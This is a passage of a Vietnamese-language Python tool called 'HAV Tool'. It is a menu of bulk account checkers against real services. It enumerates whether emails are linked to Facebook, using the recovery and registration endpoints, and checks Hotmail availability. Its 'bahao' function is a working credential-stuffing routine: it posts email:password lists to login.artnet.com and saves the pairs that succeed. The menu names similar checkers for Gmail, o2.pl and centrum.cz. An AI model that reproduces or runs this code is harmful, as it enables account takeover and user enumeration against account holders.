          'Accept': '*/*',
          'Pragma': 'no-cache',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  }

  ses=requests.Session()
  get_data=ses.get(link1,headers=h1)
  cookie=get_data.cookies.get_dict()['datr']
  get_data = get_data.text
  lsd=get_data.split('"lsd" value="')[1].split('"')[0]
  jazoest=get_data.split('"jazoest" value="')[1].split('"')[0]
  def run_check_valid(emailfb):
    data = f'lsd={lsd}&jazoest={jazoest}&email={emailfb}&did_submit=Rechercher'

    link2='https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'

    h2={
              'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
              'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
              'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
              'Content-Type': 'application/x-www-form-urlencoded',
              'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
              'Host': 'm.facebook.com',
              'Connection': 'Keep-Alive',
              'Cache-Control': 'no-cache',
              'Cookie':f'datr={cookie}',
              'Content-Length': '84',
  }

    check = requests.post(link2,headers=h2,data=data).text
    #cc = check.split('Votre recherche ne donne aucun résultat')
    kq_check = re.search("Votre recherche ne donne aucun résultat", check)
    n1=0
    n1+=1
    n2=0
    n2 +=1
    if kq_check == None:
      print ("\033[1;32mCó Liên Kết =>> " +emailfb)
      time.sleep(1)
      open(valid,"a").write(emailfb+"\n")
    else:
      print ("\033[1;31mKhông Liên Kết =>> " + emailfb)
      time.sleep(1)
  with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(run_check_valid, list_email_fb)
  chon=input("\033[1;37mBạn Có Muốn Quay Lại Menu Không? Y/n: ")
  if chon == 'Y':
        clear()
        help()
  elif chon == 'y':
        clear()
        help()
  else:
        clear()
        quit()

def run_check():
 banner = """
  \033[1;33mTool Lọc Mail Bao Mã 
  \033[1;32m••••HAV Tool••••
 """
 for x in banner:sys.stdout.write(x);sys.stdout.flush();time.sleep(0.001)

 x = open(input("\033[1;37m Nhập File Chứa Email: ")).readlines()
 save = input("\033[1;37m Nhập File Lưu Email: ")
 print("\033[1;39mVui Lòng Đợi Tool Check Mã")
 print (" [••]🐌Loading🐌[••] ")
 time.sleep(2)
 os.system("clear")
 list = []
 for e in x:
  email = e.strip("\n")
  list.append(email)
 def run(email):
  headers1 = {'Host':'d.facebook.com','user-agent':'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'mark.via.gp','dnt':'1','sec-fetch-site':'none','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','accept-language':'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7'}
  get_ck = requests.get(url="https://d.facebook.com/",headers=headers1)
  cookie = get_ck.headers['set-cookie'].split('; sb=')[0]+';'+get_ck.headers['set-cookie'].split('sb=')[1].split(';')[0]+';'
  headers2 = {'Host':'d.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','origin':'https://d.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'mark.via.gp','sec-fetch-site':'same-origin','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://d.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr','accept-language':'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7','cookie':cookie}
  get_data = requests.get(url="https://d.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr",headers=headers2).text
  lsd = get_data.split('name="lsd" value="')[1].split('"')[0]
  jazoest = get_data.split('name="jazoest" value="')[1].split('"')[0]
  reg_impression_id = get_data.split('name="reg_impression_id" value="')[1].split('"')[0]
  reg_instance = get_data.split('name="reg_instance" value="')[1].split('"')[0]
  headers3 = {'Host':'d.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','origin':'https://d.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'mark.via.gp','sec-fetch-site':'same-origin','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':'https://d.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr','accept-language':'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7','cookie':cookie}
  data = {'lsd':lsd,'jazoest':jazoest,'cpp':'2','reg_instance':reg_instance,'submission_request':'true','helper':'','reg_impression_id':reg_impression_id,'ns':'0','zero_header_af_client':'','app_id':'','logger_id':'','field_names[]':'firstname','field_names[]':'reg_email__','field_names[]':'sex','field_names[]':'birthday_wrapper','field_names[]':'reg_passwd__','lastname':'Nguyễn','firstname':'AnKhang','reg_email__':email,'sex':'2','custom_gender':'','did_use_age':'false','birthday_day':'1','birthday_month':'1','birthday_year':'1998','age_step_input':'','reg_passwd__':'','submit':'Đăng+ký'}
  check = requests.post("https://d.facebook.com/reg/submit/?cid=103", headers = headers3, data=data).text
  if 'Nhập mật khẩu có tối thiểu 6 ký tự bao gồm số' in check:
   print ('\033[1;36mHChong \033[1;33m|True\033[1;33m| \033[1;32m' + email + " | Bao Mã")
   open(save,"a").write(email + "\n")
  else:
   print ('\033[1;36mHChong \033[1;33m|False\033[1;33m| \033[1;31m' + email + " | Không Bao Mã")

 with concurrent.futures.ThreadPoolExecutor() as executor:
  executor.map(run, list)
 chon=input("\033[1;37mBạn Có Muốn Quay Lại Menu Không? Y/n: ")
 if chon == 'Y':
        clear()
        help()
 elif chon == 'y':
        clear()
        help()
 else:
        clear()
        quit()

def checkhotmail():
  logo="""\033[1;37m
╦ ╦╔═╗╔╦╗╔╦╗╔═╗╦╦    ╦  ╦╦  ╦╔═╗  ╔╦╗╦╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
╠═╣║ ║ ║ ║║║╠═╣║║    ║  ║╚╗╔╝║╣    ║║║║╣   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
╩ ╩╚═╝ ╩ ╩ ╩╩ ╩╩╩═╝  ╩═╝╩ ╚╝ ╚═╝  ═╩╝╩╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═\n """
  for bu in logo:sys.stdout.write(bu);sys.stdout.flush();time.sleep(0.001)
  print (Fore.WHITE + Style.BRIGHT + " •CÓ THỂ NHẬP ĐỊNH DẠNG MAIL|PASS")
  s = session()
  n_hotmail = 0
  hotmail = open(input(Fore.WHITE + Style.BRIGHT + " -Nhập File Hotmail(ex: hotmail.txt) : ")).readlines()
  hotmail_die = input(Fore.WHITE + Style.BRIGHT + " -Nhập File Lưu Hotmail Die(hotmaildie.txt) : ")
  for line_hotmail in hotmail:
    n_hotmail += 1
    HotMail = line_hotmail.strip("\n")
    name_hotmail = HotMail[0:HotMail.index("@")]
    DL = s.get("https://signup.live.com/signup?username="+name_hotmail+"@hotmail.com&lic=1")
    kq = re.search("isAvailable",DL.text)
    if kq == None:
      print (Fore.RED + Style.BRIGHT + " [" + str(n_hotmail) + "] Email Live : " + name_hotmail + "@hotmail.com")
    else:
      print (Fore.GREEN + Style.BRIGHT + " [" + str(n_hotmail) + "] Email Die : " + name_hotmail + "@hotmail.com")
      open(hotmail_die,"a").write(name_hotmail + "@hotmail.com" + "\n")

def bahao():
        logo="""\033[1;37m
╔═╗╦═╗╔╦╗╔╗╔╔═╗╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
╠═╣╠╦╝ ║ ║║║║╣  ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
╩ ╩╩╚═ ╩ ╝╚╝╚═╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
         \033[1;33mHAV Tool\n"""
        for vc in logo:sys.stdout.write(vc);sys.stdout.flush();time.sleep(0.001)
        try:
                print("ĐỊNH DẠNG MAIL:PASS NHA")
                Q = input("\033[1;36mNhập File Chứa Mail: \033[1;37m")
                O = input("\033[1;32mNhập File Lưu Mail: \033[1;37m")
        except:
                print("\033[1;31mKhông Tìm Thấy File!")
                quit()
        W=open(Q,'r').readlines()
        for mail in W:
                email=mail.strip("\n")
                R=email.split(':')[0]
                T=email.split(':')[1]
                data={
                'Username': R,
                'Password': T,
                '__RequestVerificationToken': 'CfDJ8PDk0bo74tpDgFw4w1cHj4uDjFpeEUBb53yLEN8H9DifBv3kqlVvcIPAX1Y0vfnAQt9nE53KtNMuyr4jCBUogWRKqyEwApGToLVQPiwvCafEl1Ibp-oQsuXeHBT78-B2aCnORqz2r_MS-61FznXPqN0',
                }
                headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.artnet.com',
                'Referer': 'https://login.artnet.com/?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Ddotcom%26response_type%3Dcode%2520id_token%26scope%3Dopenid%2520email%2520userid%26redirect_uri%3Dhttps%253A%252F%252Fwww.artnet.com%252Fmy-account%252Flogin%26state%3D7b389ffd9a2177d3cbc6f6a09e94434b347424e0639ddd5119344aea0b024fdb%26nonce%3D8d2887f7863390482b901593fa79435e87c88ff93e6fd34fdb42f65cf3f9f129%26response_mode%3Dform_post%26BackoutUrl%3Dhttps%253A%252F%252Fwww.artnet.com%252F%26hideRegistration%3DTrue',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                }
                cookies={
                'visid_incap_2666598': 'nphH9c3PRUm4b6oZWP2/MtKWZGQAAAAAQUIPAAAAAAAhvaSfs/yzi5iqZeIAKXVR',
                'incap_ses_1561_2666598': 'Zdo9HqQ5aG7b0UnnkMmpFdOWZGQAAAAAz9s7d+aUJEcdoLkJYliNQQ==',
                '_gid': 'GA1.2.1451285490.1684313814',
                '_gcl_au': '1.1.383902085.1684313815',
                '__utma': '3956448.194647232.1684313814.1684313815.1684313815.1',
                '__utmc': '3956448',
                '__utmz': '3956448.1684313815.1.1.utmcsr=yahoo|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
                '__utmv': '3956448.|2=User_ID=638199106139900000=1',
                '__utmt': '1',
                '__utmb': '3956448.1.10.1684313815',
                '_dc_gtm_UA-31229-15': '1',
                '_gat_UA-121129793-3': '1',
                '__gads': 'ID=bd5ce8e94554dff7:T=1684313815:S=ALNI_MYQbj2jUBNqGavsOaX_ML77CcPH5w',
                '__gpi': 'UID=00000c074a0fc498:T=1684313815:RT=1684313815:S=ALNI_MajfrwQMUToOoA3ip5PQMsB8M-Abg',
                '__qca': 'P0-1383996409-1684313816296',
                '_fbp': 'fb.1.1684313817529.207332170',
                '.AspNetCore.Antiforgery.9TtSrW0hzOs': 'CfDJ8PDk0bo74tpDgFw4w1cHj4uaZyh30VsEfgcUqLLBTgfPsq9riEAIHmgt9KUcuSKoswkthpjl6ldsUOWwMHH38ieCO-mfODjJyzQ8VHpq_ozeaNEfze7xofSnD3dls0w3NaSdSPfdBvc1w8lwhgkxGDE',
                '_gat_UA-121129793-1': '1',
                '_ga': 'GA1.1.194647232.1684313814',
                '_ga_KG58FKYK9Y': 'GS1.1.1684313816.1.1.1684313822.0.0.0',
                }
                params={
                'returnurl': '/connect/authorize/callback?client_id=dotcom&response_type=code%20id_token&scope=openid%20email%20userid&redirect_uri=https%3A%2F%2Fwww.artnet.com%2Fmy-account%2Flogin&state=7b389ffd9a2177d3cbc6f6a09e94434b347424e0639ddd5119344aea0b024fdb&nonce=8d2887f7863390482b901593fa79435e87c88ff93e6fd34fdb42f65cf3f9f129&response_mode=form_post&BackoutUrl=https%3A%2F%2Fwww.artnet.com%2F&hideRegistration=True',
                }
                response = requests.post('https://login.artnet.com/', params=params, cookies=cookies, headers=headers, data=data).text
                if 'Incorrect username or password'in response:
                        print(f"\033[1;31m(WRONG) {R}:{T}")
                else:
                        print(f"\033[1;32m(SUCCESS) {R}:{T}")
                        open(O,'a').write(R+':'+T+"\n")
        chon=input("\033[1;37mBạn Có Muốn Quay Lại Menu Không? Y/n: ")
        if chon == 'Y':
                clear()
                help()
        elif chon == 'y':
                clear()
                help()
        else:
                clear()
                quit()


def help():
        logohelp="""\033[1;37m                          ╔═════════════════════╗
                          ║ WELCOME TO HH TOOL ║
                          ╚═════════════════════╝
!help = Menu Tools
!o2pl = Lọc Live/Die o2.pl
!passhot = Lọc Password Hotmail
!centrum = Lọc Live/Die Cemtrum.cz
!gmail = Lọc Live/Die Gmail
!validfb = Lọc Liên Kết FB
!livediehot = Lọc Live/Die Hotmail
!baoma = Lọc Bao Mã Email
!passartnet = Lọc Password Artnet.com
BẠN CÓ THỂ SỬ DỤNG CÁC LỆNH NHƯ SAU:
\033[1;37m╔═══════╗
║ !o2pl ║
╚═══════╝
\033[1;37m╔══════════╗
║ !passhot ║
╚══════════╝
\033[1;37m╔══════════╗
║ !centrum ║
╚══════════╝
\033[1;37m╔════════╗
║ !gmail ║
╚════════╝
\033[1;37m╔══════════╗
║ !validfb ║
╚══════════╝
\033[1;37m╔═════════════╗
║ !livediehot ║
╚═════════════╝
\033[1;37m╔════════╗
║ !baoma ║
╚════════╝
\033[1;37m╔═════════════╗
║ !passartnet ║
╚═════════════╝\n"""

        for uoi in logohelp:sys.stdout.write(uoi);sys.stdout.flush();time.sleep(0.001)
        luachon()
xduong = "\033[94m"
xnhac = "\033[96m"
luc = "\033[92m"
do = "\033[91m"
vang = "\033[93m"
trang = "\033[97m"
hong = "\033[95m"
def logo():

        logo="""
\033[94m██╗  ██╗ █████╗ ██╗   ██╗
\033[92m██║  ██║██╔══██╗██║   ██║
\033[91m███████║███████║╚██╗ ██╔╝
\033[95m██╔══██║██╔══██║ ╚████╔╝
\033[97m██║  ██║██║  ██║  ╚██╔╝
\033[93m╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
                \033[1;33mAuthor: \033[1;37mHAV Tool\n"""
        clear()
        for pr in logo:sys.stdout.write(pr);sys.stdout.flush();time.sleep(0.001)
        print("NẾU BẠN KHÔNG BIẾT SỬ DỤNG LỆNH VÀO TOOL HÃY DÙNG LỆNH !help")


def luachon():
        chon=input("\033[1;33mabcxyz\033[1;94m@\033[1;35mHAVtool ")
        if chon == '!help':
                clear()
                help()
        if chon == '!o2pl':
                clear()
                o2pl()
        if chon == '!passhot':
                clear()
                passhot()
        if chon == '!centrum':
                clear()
                centrum()
        if chon == '!gmail':
                clear()
                gmail()
        if chon == '!validfb':
                clear()
                validfb()
        if chon == '!baoma':
                clear()
                run_check()
        if chon == '!livediehot':
                clear()
                checkhotmail()
        if chon == '!passartnet':
                clear()
                bahao()
logo()
luachon()